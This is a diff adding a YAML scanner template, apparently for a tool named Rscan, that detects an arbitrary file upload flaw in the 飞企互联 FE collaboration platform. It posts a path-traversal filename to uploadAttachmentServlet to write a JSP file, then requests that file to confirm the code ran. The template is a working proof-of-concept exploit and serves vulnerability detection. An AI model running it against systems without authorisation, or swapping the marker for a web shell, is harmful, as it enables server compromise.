@@ -1,0 +1,18 @@
+name: 飞企互联-FE业务协作平台-uploadAttachmentServlet
+description: >-
+  任意文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /servlet/uploadAttachmentServlet
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
+    body: "------WebKitFormBoundaryKNt0t4vBe8cX9rZk\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"../../../../../jboss/web/fe.war/Rscan.jsp\"\r\nContent-Type: text/plain\r\n\r\n<% out.println(\"Rscan_test\");%>\r\n------WebKitFormBoundaryKNt0t4vBe8cX9rZk\r\nContent-Disposition: form-data; name=\"json\"\r\n\r\n{\"iq\":{\"query\":{\"UpdateType\":\"mail\"}}}\r\n------WebKitFormBoundaryKNt0t4vBe8cX9rZk--"
+    expression:
+      status: 200
+  - method: GET
+    path: "/Rscan.jsp;"
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
